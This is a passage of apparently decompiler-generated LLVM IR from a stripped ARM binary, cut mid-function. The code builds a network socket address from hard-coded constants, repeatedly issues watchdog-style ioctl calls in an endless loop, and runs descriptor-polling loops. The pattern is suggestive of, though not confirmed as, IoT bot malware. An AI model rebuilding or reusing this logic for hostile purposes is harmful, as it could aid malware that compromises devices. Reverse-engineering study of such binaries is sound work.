  %v0_d804 = call i32 @function_10ac8()
  %v7_d808 = icmp eq i32 %v0_d804, -1
  %. = zext i1 %v7_d808 to i32
  %tmp12 = icmp slt i32 %v0_d804, 1
  %storemerge5 = select i1 %tmp12, i32 %., i32 1
  store i32 %storemerge5, i32* @r5, align 4
  %v2_d824 = icmp eq i32 %storemerge5, 0
  store i32 %v0_d804, i32* @global_var_1e9cc.81, align 4
  br i1 %v2_d824, label %dec_label_pc_d83c, label %dec_label_pc_d830

dec_label_pc_d830:                                ; preds = %dec_label_pc_d7fc
  store i32 %v3_d7fc, i32* @r4, align 4
  store i32 %v6_d7fc, i32* @r5, align 4
  store i32 %v9_d7fc, i32* @lr, align 4
  ret i32 %v0_d804

dec_label_pc_d83c:                                ; preds = %dec_label_pc_d7fc
  store i32 1, i32* %stack_var_-20, align 4
  %v1_d848 = call i32 @function_fd60(i32 26)
  %v1_d850 = call i32 @function_fd60(i32 27)
  %v0_d854 = load i32, i32* @r5, align 4
  %v2_d85c = inttoptr i32 %v0_d854 to i32*
  %v3_d85c = call i32 @function_fc9c(i32 26, i32* %v2_d85c)
  %v2_d864 = call i32 @function_109e4(i32 %v3_d85c, i32 2)
  %v7_d868 = icmp eq i32 %v2_d864, -1
  store i32 %v2_d864, i32* @r4, align 4
  br i1 %v7_d868, label %dec_label_pc_d8b0, label %dec_label_pc_d874

dec_label_pc_d874:                                ; preds = %dec_label_pc_d8b0, %dec_label_pc_d83c
  %v0_d880 = phi i32 [ %v2_d8c0, %dec_label_pc_d8b0 ], [ %v2_d864, %dec_label_pc_d83c ]
  %v2_d884 = ptrtoint i32* %stack_var_-20 to i32
  %v3_d888 = call i32 @function_10d4c(i32 %v0_d880, i32 -2147199228, i32 %v2_d884)
  br label %dec_label_pc_d88c

dec_label_pc_d88c:                                ; preds = %dec_label_pc_d88c, %dec_label_pc_d874
  %v0_d898 = load i32, i32* @r4, align 4
  %v3_d8a0 = call i32 @function_10d4c(i32 %v0_d898, i32 -2147199227, i32 0)
  %v1_d8a8 = call i32 @function_12ef0(i32 10)
  br label %dec_label_pc_d88c

dec_label_pc_d8b0:                                ; preds = %dec_label_pc_d83c
  %v0_d8b0 = load i32, i32* @r5, align 4
  %v2_d8b8 = inttoptr i32 %v0_d8b0 to i32*
  %v3_d8b8 = call i32 @function_fc9c(i32 27, i32* %v2_d8b8)
  %v2_d8c0 = call i32 @function_109e4(i32 %v3_d8b8, i32 2)
  %v3_d8c4 = icmp eq i32 %v2_d8c0, -1
  store i32 %v2_d8c0, i32* @r4, align 4
  br i1 %v3_d8c4, label %dec_label_pc_d8d0, label %dec_label_pc_d874

dec_label_pc_d8d0:                                ; preds = %dec_label_pc_d8b0
  %v1_d8d4 = call i32 @function_fcc0(i32 26)
  %v1_d8dc = call i32 @function_fcc0(i32 27)
  %v0_d8e0 = load i32, i32* @r5, align 4
  %v1_d8e4 = call i32 @function_12e38(i32 %v0_d8e0)
  %v0_d8e8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d8e8, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_d8d0
  %v2_d8e8 = load i32, i32* @ip, align 4
  %v5_d8e81 = udiv i32 %v2_d8e8, 524288
  %v6_d8e8 = and i32 %v5_d8e81, 2
  store i32 %v6_d8e8, i32* @lr, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_d8d0, %bb15
  ret i32 %v1_d8e4

; uselistorder directives
  uselistorder i32 %v2_d8c0, { 1, 2, 0 }
  uselistorder i32 %v2_d864, { 1, 2, 0 }
  uselistorder i32 %storemerge5, { 1, 0 }
  uselistorder i32 %v0_d804, { 3, 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @function_d8ec(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_d8ec:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-1432 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-42 = alloca i8*, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-408 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v15_d8ec = load i32, i32* @r8, align 4
  %v2_d8fc = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_d8fc, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %tmp, i32* @r8, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v2_d914 = call i32 @function_1167c(i32* nonnull %stack_var_-64)
  store i32 %v2_d8fc, i32* @r0, align 4
  %v2_d920 = call i32 @function_11638(i32 %v2_d8fc, i32 2)
  %v0_d924 = load i32, i32* @r5, align 4
  store i32 %v0_d924, i32* %r2.global-to-local, align 4
  %v3_d930 = call i32 @function_10da0(i32 %v0_d924, i32 %v2_d8fc, i32 %v0_d924)
  %v2_d93c = call i32 @function_11690(i32 17, i32 1)
  %v2_d948 = call i32 @function_11690(i32 5, i32 54844)
  %v0_d94c = call i32 @function_105d4()
  store i32 ptrtoint (i16** @global_var_20a58.77 to i32), i32* %r2.global-to-local, align 4
  store i32 1494907824, i32* @global_var_20a5c.78, align 4
  store i32 2, i32* %ip.global-to-local, align 4
  store i32 5888, i32* %r3.global-to-local, align 4
  store i32 %v0_d94c, i32* @global_var_20a4c.46, align 4
  store i16 5888, i16* bitcast (i32* @global_var_20a5a.79 to i16*), align 4
  store i16 2, i16* bitcast (i16** @global_var_20a58.77 to i16*), align 4
  %v6_d974 = call i32 @function_fe00(i32 %v0_d94c, i32 ptrtoint (i32* @global_var_20a4c.46 to i32), i32 ptrtoint (i16** @global_var_20a58.77 to i32), i32 5888)
  store i32 ptrtoint (i32* @global_var_d7b4.69 to i32), i32* %r3.global-to-local, align 4
  store i32 124928, i32* @lr, align 4
  %v2_d980 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_d980, i32* @sb, align 4
  store i32 ptrtoint (i32* @global_var_d7b4.69 to i32), i32* inttoptr (i32 124928 to i32*), align 2048
  %v1_d988 = call i32 @function_d654(i32 %v6_d974)
  %v1_d98c = call i32 @function_e110(i32 %v1_d988)
  store i32 %v2_d980, i32* @r0, align 4
  store i32 32, i32* @r1, align 4
  %v0_d998 = call i32 @function_103ac()
  %v0_d99c = load i32, i32* @r6, align 4
  %v7_d99c = icmp eq i32 %v0_d99c, 2
  br i1 %v7_d99c, label %dec_label_pc_dacc, label %dec_label_pc_d9a4

dec_label_pc_d9a4:                                ; preds = %dec_label_pc_dacc, %dec_label_pc_d8ec, %dec_label_pc_dadc
  %v0_d9a4 = call i32 @function_e0b4()
  store i32 %v0_d9a4, i32* @r6, align 4
  %v0_d9ac = load i32, i32* @r8, align 4
  %v1_d9ac = inttoptr i32 %v0_d9ac to i32*
  %v2_d9ac = load i32, i32* %v1_d9ac, align 4
  %v1_d9b0 = inttoptr i32 %v2_d9ac to i8*
  %v2_d9b0 = call i32 @function_10318(i8* %v1_d9b0)
  %v0_d9b8 = load i32, i32* @r8, align 4
  %v1_d9b8 = inttoptr i32 %v0_d9b8 to i32*
  %v2_d9b8 = load i32, i32* %v1_d9b8, align 4
  %v1_d9bc = inttoptr i32 %v2_d9b8 to i8*
  %v2_d9bc = call i32 @function_10318(i8* %v1_d9bc)
  %v1_d9c0 = sub i32 20, %v2_d9b0
  store i32 %v2_d9bc, i32* @r4, align 4
  %v0_d9c8 = load i32, i32* @r6, align 4
  %v2_d9cc = call i32 @function_10970(i32 %v0_d9c8, i32 %v1_d9c0)
  %v2_d9d0 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_d9d0, i32* @r5, align 4
  %v0_d9d4 = load i32, i32* @r4, align 4
  %v2_d9d4 = add i32 %v0_d9d4, %v1_d9c0
  store i32 %v2_d9d4, i32* @r4, align 4
  %v2_d9e0 = call i32 @function_e178(i32 %v2_d9d0, i32 %v2_d9d4)
  %v2_d9e4 = ptrtoint i32* %stack_var_-40 to i32
  %v1_d9e8 = load i32, i32* @r4, align 4
  %v2_d9e8 = add i32 %v1_d9e8, %v2_d9e4
  store i32 %v2_d9e8, i32* %r3.global-to-local, align 4
  store i32 0, i32* @sl, align 4
  %v0_d9f4 = load i32, i32* @r8, align 4
  %v1_d9f4 = inttoptr i32 %v0_d9f4 to i32*
  %v2_d9f4 = load i32, i32* %v1_d9f4, align 4
  store i32 %v2_d9f4, i32* @r0, align 4
  %v3_d9f8 = add i32 %v2_d9e8, -80
  %v4_d9f8 = inttoptr i32 %v3_d9f8 to i8*
  store i8 0, i8* %v4_d9f8, align 1
  %v2_d9fc = inttoptr i32 %v2_d9f4 to i8*
  %v3_d9fc = call i32 @function_10340(i8* %v2_d9fc, i32 %v2_d9d0)
  store i32 32, i32* @r1, align 4
  store i32 %v2_d9d0, i32* @r0, align 4
  %v0_da08 = call i32 @function_103ac()
  %v0_da0c = call i32 @function_e0b4()
  store i32 %v0_da0c, i32* @r7, align 4
  %v0_da14 = load i32, i32* @r8, align 4
  %v1_da14 = inttoptr i32 %v0_da14 to i32*
  %v2_da14 = load i32, i32* %v1_da14, align 4
  %v1_da18 = inttoptr i32 %v2_da14 to i8*
  %v2_da18 = call i32 @function_10318(i8* %v1_da18)
  store i32 %v2_da18, i32* @r6, align 4
  %v0_da20 = load i32, i32* @r8, align 4
  %v1_da20 = inttoptr i32 %v0_da20 to i32*
  %v2_da20 = load i32, i32* %v1_da20, align 4
  %v1_da24 = inttoptr i32 %v2_da20 to i8*
  %v2_da24 = call i32 @function_10318(i8* %v1_da24)
  %v0_da28 = load i32, i32* @r6, align 4
  %v1_da28 = sub i32 20, %v0_da28
  store i32 %v2_da24, i32* @r4, align 4
  %v0_da30 = load i32, i32* @r7, align 4
  %v2_da34 = call i32 @function_10970(i32 %v0_da30, i32 %v1_da28)
  %v0_da38 = load i32, i32* @r4, align 4
  %v2_da38 = add i32 %v0_da38, %v1_da28
  store i32 %v2_da38, i32* @r4, align 4
  %v2_da44 = call i32 @function_e178(i32 %v2_d9d0, i32 %v2_da38)
  store i32 %v2_d9e4, i32* %r2.global-to-local, align 4
  %v1_da4c = load i32, i32* @r4, align 4
  %v2_da4c = add i32 %v1_da4c, %v2_d9e4
  store i32 %v2_da4c, i32* %r3.global-to-local, align 4
  %v0_da50 = load i32, i32* @sl, align 4
  %v1_da50 = trunc i32 %v0_da50 to i8
  %v3_da50 = add i32 %v2_da4c, -80
  %v4_da50 = inttoptr i32 %v3_da50 to i8*
  store i8 %v1_da50, i8* %v4_da50, align 1
  %v4_da5c = call i32 @function_10a88(i32 15, i32 %v2_d9d0, i32 %v2_d9e4, i32 %v2_da4c)
  %v1_da64 = call i32 @function_fd60(i32 5)
  %v3_da74 = call i32 @function_fc9c(i32 5, i32* nonnull %stack_var_-48)
  %v3_da78 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_da78, i32* %r2.global-to-local, align 4
  %v2_da84 = call i32 @function_10ce4(i32 1, i32 %v3_da74)
  store i32 1, i32* %r2.global-to-local, align 4
  %v2_da94 = call i32 @function_10ce4(i32 1, i32 ptrtoint (i32* @global_var_16180.89 to i32))
  %v1_da9c = call i32 @function_fcc0(i32 5)
  %v1_daa0 = call i32 @function_85e0(i32 %v1_da9c)
  %v1_daa4 = call i32 @function_cef8(i32 %v1_daa0)
  store i32 %v1_daa4, i32* @r0, align 4
  %v1_daa8 = call i32 @function_d7fc(i32 %v1_daa4)
  store i32 %v1_daa8, i32* @r0, align 4
  %v0_daac = call i32 @function_10ac8()
  %v1_dab0 = load i32, i32* @sl, align 4
  %v7_dab4 = icmp sgt i32 %v0_daac, %v1_dab0
  br i1 %v7_dab4, label %dec_label_pc_dab8, label %dec_label_pc_db04

dec_label_pc_dab8:                                ; preds = %dec_label_pc_d9a4
  store i32 %v15_d8ec, i32* %r8.global-to-local, align 4
  ret i32 %v1_dab0

dec_label_pc_dacc:                                ; preds = %dec_label_pc_d8ec
  %v0_dacc = load i32, i32* @r8, align 4
  %v1_dacc = add i32 %v0_dacc, 4
  %v2_dacc = inttoptr i32 %v1_dacc to i32*
  %v3_dacc = load i32, i32* %v2_dacc, align 4
  %v1_dad0 = inttoptr i32 %v3_dacc to i8*
  %v2_dad0 = call i32 @function_10318(i8* %v1_dad0)
  %v8_dad8 = icmp sgt i32 %v2_dad0, 31
  br i1 %v8_dad8, label %dec_label_pc_d9a4, label %dec_label_pc_dadc

dec_label_pc_dadc:                                ; preds = %dec_label_pc_dacc
  %v0_dadc = load i32, i32* @r8, align 4
  %v1_dadc = add i32 %v0_dadc, 4
  %v2_dadc = inttoptr i32 %v1_dadc to i32*
  %v3_dadc = load i32, i32* %v2_dadc, align 4
  store i32 %v2_d980, i32* @r0, align 4
  %v2_dae4 = bitcast i32* %stack_var_-152 to i8*
  %v3_dae4 = call i32 @function_10340(i8* %v2_dae4, i32 %v3_dadc)
  %v0_dae8 = load i32, i32* @r8, align 4
  %v1_dae8 = add i32 %v0_dae8, 4
  %v2_dae8 = inttoptr i32 %v1_dae8 to i32*
  %v3_dae8 = load i32, i32* %v2_dae8, align 4
  %v1_daf0 = inttoptr i32 %v3_dae8 to i8*
  %v2_daf0 = call i32 @function_10318(i8* %v1_daf0)
  store i32 %v2_daf0, i32* @r1, align 4
  store i32 %v3_dae8, i32* @r0, align 4
  %v0_dafc = call i32 @function_103ac()
  br label %dec_label_pc_d9a4

dec_label_pc_db04:                                ; preds = %dec_label_pc_d9a4
  %v1_db04 = call i32 @function_10d18(i32 %v0_daac)
  %v0_db0c = load i32, i32* @sl, align 4
  %v1_db10 = call i32 @function_10dd8(i32 %v0_db0c)
  %v1_db18 = call i32 @function_10dd8(i32 1)
  %v1_db20 = call i32 @function_10dd8(i32 2)
  store i32 124924, i32* @fp, align 4
  %v1_db28 = call i32 @function_85e0(i32 %v1_db20)
  %v1_db2c = call i32 @function_cef8(i32 %v1_db28)
  store i32 %v1_db2c, i32* @r0, align 4
  %v1_db30 = call i32 @function_d7fc(i32 %v1_db2c)
  store i32 %v1_db30, i32* @r0, align 4
  %v1_db34 = call i32 @function_e54c(i32 %v1_db30)
  %v0_db38 = load i32, i32* @sl, align 4
  %v2_db3c = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_db3c, i32* @r7, align 4
  %v2_db40 = ptrtoint i32* %stack_var_-408 to i32
  store i32 %v2_db40, i32* @r6, align 4
  %v2_dc20 = ptrtoint i32* %stack_var_-72 to i32
  %v2_dc70 = ptrtoint i32* %stack_var_-168 to i32
  %v2_de4c = ptrtoint i32* %stack_var_-56 to i32
  %v2_de54 = ptrtoint i8** %stack_var_-42 to i32
  %v2_dff8 = ptrtoint i32* %stack_var_-1432 to i32
  %v2_de70 = ptrtoint i32* %stack_var_-52 to i32
  %v1_df20 = bitcast i32* %stack_var_-152 to i8*
  %v2_dee4 = ptrtoint i32* %stack_var_-88 to i32
  %v1_defc = sub i32 0, %v1_db04
  br label %dec_label_pc_db44

dec_label_pc_db44:                                ; preds = %dec_label_pc_df80, %dec_label_pc_e01c, %bb43, %dec_label_pc_df1c, %dec_label_pc_dd54, %dec_label_pc_dd44, %bb40, %dec_label_pc_e070, %dec_label_pc_dfdc, %dec_label_pc_df90, %dec_label_pc_df6c, %dec_label_pc_de9c, %dec_label_pc_ddc4, %dec_label_pc_dcfc, %dec_label_pc_db04
  %stack_var_-1436.0 = phi i32 [ %v0_db38, %dec_label_pc_db04 ], [ %stack_var_-1436.0, %bb40 ], [ %stack_var_-1436.1, %dec_label_pc_dd44 ], [ %stack_var_-1436.1, %dec_label_pc_dd54 ], [ %stack_var_-1436.1, %bb43 ], [ %stack_var_-1436.1, %dec_label_pc_df90 ], [ %stack_var_-1436.1, %dec_label_pc_ddc4 ], [ %stack_var_-1436.1, %dec_label_pc_e01c ], [ %stack_var_-1436.1, %dec_label_pc_e070 ], [ %stack_var_-1436.1, %dec_label_pc_dfdc ], [ %stack_var_-1436.1, %dec_label_pc_dcfc ], [ %stack_var_-1436.1, %dec_label_pc_df1c ], [ %stack_var_-1436.1, %dec_label_pc_df6c ], [ %stack_var_-1436.1, %dec_label_pc_de9c ], [ %stack_var_-1436.1, %dec_label_pc_df80 ]
  store i32 0, i32* %stack_var_-280, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_db50

dec_label_pc_db50:                                ; preds = %dec_label_pc_db50, %dec_label_pc_db44
  %v1_db54 = phi i32 [ %v1_db58, %dec_label_pc_db50 ], [ 4, %dec_label_pc_db44 ]
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_db54 = load i32, i32* @r7, align 4
  %v3_db54 = add i32 %v2_db54, %v1_db54
  %v4_db54 = inttoptr i32 %v3_db54 to i32*
  store i32 0, i32* %v4_db54, align 4
  %v0_db58 = load i32, i32* %r3.global-to-local, align 4
  %v1_db58 = add i32 %v0_db58, 4
  store i32 %v1_db58, i32* %r3.global-to-local, align 4
  %v7_db5c = icmp eq i32 %v1_db58, 128
  br i1 %v7_db5c, label %dec_label_pc_db64, label %dec_label_pc_db50

dec_label_pc_db64:                                ; preds = %dec_label_pc_db50
  %v0_db64 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_db64, i32* %stack_var_-408, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_db6c

dec_label_pc_db6c:                                ; preds = %dec_label_pc_db6c, %dec_label_pc_db64
  %v1_db70 = phi i32 [ %v1_db74, %dec_label_pc_db6c ], [ 4, %dec_label_pc_db64 ]
  store i32 0, i32* @r4, align 4
  %v2_db70 = load i32, i32* @r6, align 4
  %v3_db70 = add i32 %v2_db70, %v1_db70
  %v4_db70 = inttoptr i32 %v3_db70 to i32*
  store i32 0, i32* %v4_db70, align 4
  %v0_db74 = load i32, i32* %r3.global-to-local, align 4
  %v1_db74 = add i32 %v0_db74, 4
  store i32 %v1_db74, i32* %r3.global-to-local, align 4
  %v7_db78 = icmp eq i32 %v1_db74, 128
  br i1 %v7_db78, label %dec_label_pc_db80, label %dec_label_pc_db6c

dec_label_pc_db80:                                ; preds = %dec_label_pc_db6c
  store i32 124920, i32* %r3.global-to-local, align 4
  %v2_db84 = load i32, i32* inttoptr (i32 124920 to i32*), align 8
  %v7_db88 = icmp eq i32 %v2_db84, -1
  br i1 %v7_db88, label %dec_label_pc_dbb4, label %dec_label_pc_db90

dec_label_pc_db90:                                ; preds = %dec_label_pc_db80
  %v3_db90 = udiv i32 %v2_db84, 32
  %v3_db94 = mul nuw nsw i32 %v3_db90, 4
  store i32 %v2_d9e4, i32* %ip.global-to-local, align 4
  %v2_db9c = add i32 %v3_db94, %v2_d9e4
  store i32 %v2_db9c, i32* %r3.global-to-local, align 4
  %v1_dba0 = add i32 %v2_db9c, -240
  %v2_dba0 = inttoptr i32 %v1_dba0 to i32*
  %v3_dba0 = load i32, i32* %v2_dba0, align 4
  %v1_dba4 = urem i32 %v2_db84, 32
  %v7_dbac = shl i32 1, %v1_dba4
  %v8_dbac = or i32 %v3_dba0, %v7_dbac
  store i32 %v8_dbac, i32* %r2.global-to-local, align 4
  store i32 %v8_dbac, i32* %v2_dba0, align 4
  br label %dec_label_pc_dbb4

dec_label_pc_dbb4:                                ; preds = %dec_label_pc_db80, %dec_label_pc_db90
  %v0_dbb4 = load i32, i32* @fp, align 4
  %v1_dbb4 = inttoptr i32 %v0_dbb4 to i32*
  %v2_dbb4 = load i32, i32* %v1_dbb4, align 4
  store i32 %v2_dbb4, i32* @r3, align 4
  %v7_dbb8 = icmp eq i32 %v2_dbb4, -1
  store i32 124924, i32* %r8.global-to-local, align 4
  br i1 %v7_dbb8, label %dec_label_pc_dddc, label %dec_label_pc_dbc4

dec_label_pc_dbc4:                                ; preds = %dec_label_pc_dddc, %dec_label_pc_dbb4, %bb42
  %v2_dbc8 = load i8, i8* bitcast (i8** @global_var_1e9d0.93 to i8*), align 4
  %v3_dbc8 = zext i8 %v2_dbc8 to i32
  store i32 %v3_dbc8, i32* %r3.global-to-local, align 4
  %v2_dbcc = icmp eq i8 %v2_dbc8, 0
  %v0_dd18 = load i32, i32* @fp, align 4
  %v1_dd18 = inttoptr i32 %v0_dd18 to i32*
  %v2_dd18 = load i32, i32* %v1_dd18, align 4
  store i32 %v2_dd18, i32* %ip.global-to-local, align 4
  %v3_dd1c = udiv i32 %v2_dd18, 32
  store i32 %v3_dd1c, i32* %r3.global-to-local, align 4
  br i1 %v2_dbcc, label %dec_label_pc_dd18, label %dec_label_pc_dbd4

dec_label_pc_dbd4:                                ; preds = %dec_label_pc_dbc4
  %v3_dbe0 = mul nuw nsw i32 %v3_dd1c, 4
  %v2_dbe4 = add i32 %v3_dbe0, %v2_d9e4
  store i32 %v2_dbe4, i32* %r3.global-to-local, align 4
  %v1_dbe8 = add i32 %v2_dbe4, -368
  %v2_dbe8 = inttoptr i32 %v1_dbe8 to i32*
  %v3_dbe8 = load i32, i32* %v2_dbe8, align 4
  %v1_dbec = urem i32 %v2_dd18, 32
  %v7_dbf4 = shl i32 1, %v1_dbec
  %v8_dbf4 = or i32 %v3_dbe8, %v7_dbf4
  store i32 %v8_dbf4, i32* %r2.global-to-local, align 4
  store i32 %v8_dbf4, i32* %v2_dbe8, align 4
  br label %dec_label_pc_dbfc

dec_label_pc_dbfc:                                ; preds = %dec_label_pc_dd18, %dec_label_pc_dbd4
  store i32 124920, i32* %r3.global-to-local, align 4
  %v2_dc00 = load i32, i32* inttoptr (i32 124920 to i32*), align 8
  store i32 0, i32* @lr, align 4
  %v0_dc08 = load i32, i32* %ip.global-to-local, align 4
  %v5_dc0c = icmp slt i32 %v0_dc08, %v2_dc00
  br i1 %v5_dc0c, label %bb40, label %bb

bb:                                               ; preds = %dec_label_pc_dbfc
  br label %bb40

bb40:                                             ; preds = %dec_label_pc_dbfc, %bb
  %v0_dc1c = phi i32 [ %v2_dc00, %dec_label_pc_dbfc ], [ %v0_dc08, %bb ]
  store i32 10, i32* %stack_var_-72, align 4
  %v1_dc1c = add i32 %v0_dc1c, 1
  store i32 %v2_dc20, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_db40, i32* %r2.global-to-local, align 4
  %v5_dc38 = call i32 @function_10afc(i32 %v1_dc1c, i32 %v2_db3c, i32 %v2_db40, i32 0, i32 %v2_dc20)
  %v8_dc3c = icmp eq i32 %v5_dc38, -1
  br i1 %v8_dc3c, label %dec_label_pc_db44, label %dec_label_pc_dc44

dec_label_pc_dc44:                                ; preds = %bb40
  %v6_dc38 = trunc i32 %v5_dc38 to i16
  %v3_dc44 = icmp eq i16 %v6_dc38, 0
  br i1 %v3_dc44, label %dec_label_pc_dc4c, label %dec_label_pc_dc80

dec_label_pc_dc4c:                                ; preds = %dec_label_pc_dc44
  %v5_dc58 = srem i32 %stack_var_-1436.0, 6
  %v4_dc60 = sub i32 %stack_var_-1436.0, %v5_dc58
  store i32 %v4_dc60, i32* %r3.global-to-local, align 4
  %v2_dc68 = icmp eq i32 %v5_dc58, 0
  %v1_dc6c = add i32 %stack_var_-1436.0, 1
  store i32 %v1_dc6c, i32* @lr, align 4
  store i32 %v2_dc70, i32* %r2.global-to-local, align 4
  %v7_dc74 = inttoptr i32 %v5_dc38 to i8*
  store i8* %v7_dc74, i8** %stack_var_-42, align 4
  br i1 %v2_dc68, label %dec_label_pc_de4c, label %dec_label_pc_dc80

dec_label_pc_dc80:                                ; preds = %dec_label_pc_dc44, %dec_label_pc_dc4c, %dec_label_pc_de4c
  %stack_var_-1436.1 = phi i32 [ %v1_dc6c, %dec_label_pc_de4c ], [ %v1_dc6c, %dec_label_pc_dc4c ], [ %stack_var_-1436.0, %dec_label_pc_dc44 ]
  store i32 124920, i32* %r3.global-to-local, align 4
  %v2_dc84 = load i32, i32* inttoptr (i32 124920 to i32*), align 8
  %v7_dc88 = icmp eq i32 %v2_dc84, -1
  br i1 %v7_dc88, label %dec_label_pc_dcb4, label %dec_label_pc_dc90

dec_label_pc_dc90:                                ; preds = %dec_label_pc_dc80
  %v3_dc90 = udiv i32 %v2_dc84, 32
  %v3_dc94 = mul nuw nsw i32 %v3_dc90, 4
  store i32 %v2_d9e4, i32* %ip.global-to-local, align 4
  %v2_dc9c = add i32 %v3_dc94, %v2_d9e4
  store i32 %v2_dc9c, i32* %r3.global-to-local, align 4
  %v1_dca0 = add i32 %v2_dc9c, -240
  %v2_dca0 = inttoptr i32 %v1_dca0 to i32*
  %v3_dca0 = load i32, i32* %v2_dca0, align 4
  %v1_dca4 = urem i32 %v2_dc84, 32
  %v6_dca8 = lshr i32 %v3_dca0, %v1_dca4
  store i32 %v6_dca8, i32* %r2.global-to-local, align 4
  %v1_dcac = urem i32 %v6_dca8, 2
  %v2_dcac = icmp eq i32 %v1_dcac, 0
  br i1 %v2_dcac, label %dec_label_pc_dcb4, label %dec_label_pc_ded8

dec_label_pc_dcb4:                                ; preds = %dec_label_pc_dc90, %dec_label_pc_dc80
  %v2_dcb8 = load i8, i8* bitcast (i8** @global_var_1e9d0.93 to i8*), align 4
  %v3_dcb8 = zext i8 %v2_dcb8 to i32
  store i32 %v3_dcb8, i32* @r4, align 4
  %v2_dcbc = icmp eq i8 %v2_dcb8, 0
  %v0_dd44 = load i32, i32* @fp, align 4
  %v1_dd44 = inttoptr i32 %v0_dd44 to i32*
  %v2_dd44 = load i32, i32* %v1_dd44, align 4
  br i1 %v2_dcbc, label %dec_label_pc_dd44, label %dec_label_pc_dcc4

dec_label_pc_dcc4:                                ; preds = %dec_label_pc_dcb4
  %v3_dcc8 = udiv i32 %v2_dd44, 32
  store i32 %v2_d9e4, i32* %r2.global-to-local, align 4
  %v3_dcd0 = mul nuw nsw i32 %v3_dcc8, 4
  %v2_dcd4 = add i32 %v3_dcd0, %v2_d9e4
  store i32 %v2_dcd4, i32* %r3.global-to-local, align 4
  %v1_dcd8 = add i32 %v2_dcd4, -368
  %v2_dcd8 = inttoptr i32 %v1_dcd8 to i32*
  %v3_dcd8 = load i32, i32* %v2_dcd8, align 4
  %v1_dcdc = urem i32 %v2_dd44, 32
  %v6_dce0 = lshr i32 %v3_dcd8, %v1_dcdc
  store i32 %v6_dce0, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_1e9d0.93 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_dcec = urem i32 %v6_dce0, 2
  %v2_dcec = icmp eq i32 %v1_dcec, 0
  store i8 0, i8* bitcast (i8** @global_var_1e9d0.93 to i8*), align 4
  store i32 124924, i32* @r5, align 4
  br i1 %v2_dcec, label %dec_label_pc_dcfc, label %dec_label_pc_de68

dec_label_pc_dcfc:                                ; preds = %dec_label_pc_dcc4
  store i32 56580, i32* @lr, align 4
  %v1_dd00 = icmp ne i32 %v2_dd44, -1
  call void @__pseudo_cond_branch(i1 %v1_dd00, i32 ptrtoint (i32* @global_var_10dd8.95 to i32))
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_dd08 = load i32, i32* @r5, align 4
  %v2_dd08 = inttoptr i32 %v1_dd08 to i32*
  store i32 -1, i32* %v2_dd08, align 4
  %v1_dd10 = call i32 @function_12ef0(i32 1)
  br label %dec_label_pc_db44

dec_label_pc_dd18:                                ; preds = %dec_label_pc_dbc4
  store i32 %v2_d9e4, i32* %r2.global-to-local, align 4
  %v3_dd24 = mul nuw nsw i32 %v3_dd1c, 4
  %v2_dd28 = add i32 %v3_dd24, %v2_d9e4
  store i32 %v2_dd28, i32* %r3.global-to-local, align 4
  %v1_dd2c = add i32 %v2_dd28, -240
  %v2_dd2c = inttoptr i32 %v1_dd2c to i32*
  %v3_dd2c = load i32, i32* %v2_dd2c, align 4
  %v1_dd30 = urem i32 %v2_dd18, 32
  %v7_dd38 = shl i32 1, %v1_dd30
  %v8_dd38 = or i32 %v3_dd2c, %v7_dd38
  store i32 %v8_dd38, i32* %r2.global-to-local, align 4
  store i32 %v8_dd38, i32* %v2_dd2c, align 4
  br label %dec_label_pc_dbfc

dec_label_pc_dd44:                                ; preds = %dec_label_pc_dcb4
  %v7_dd48 = icmp eq i32 %v2_dd44, -1
  store i32 124924, i32* @r8, align 4
  br i1 %v7_dd48, label %dec_label_pc_db44, label %dec_label_pc_dd54

dec_label_pc_dd54:                                ; preds = %dec_label_pc_dd44
  %v3_dd54 = udiv i32 %v2_dd44, 32
  store i32 %v2_d9e4, i32* %r2.global-to-local, align 4
  %v3_dd5c = mul nuw nsw i32 %v3_dd54, 4
  %v2_dd60 = add i32 %v3_dd5c, %v2_d9e4
  store i32 %v2_dd60, i32* %r3.global-to-local, align 4
  %v1_dd64 = add i32 %v2_dd60, -240
  %v2_dd64 = inttoptr i32 %v1_dd64 to i32*
  %v3_dd64 = load i32, i32* %v2_dd64, align 4
  %v1_dd68 = urem i32 %v2_dd44, 32
  %v6_dd6c = lshr i32 %v3_dd64, %v1_dd68
  store i32 %v6_dd6c, i32* %r2.global-to-local, align 4
  %v1_dd70 = urem i32 %v6_dd6c, 2
  %v2_dd70 = icmp eq i32 %v1_dd70, 0
  br i1 %v2_dd70, label %dec_label_pc_db44, label %dec_label_pc_dd78

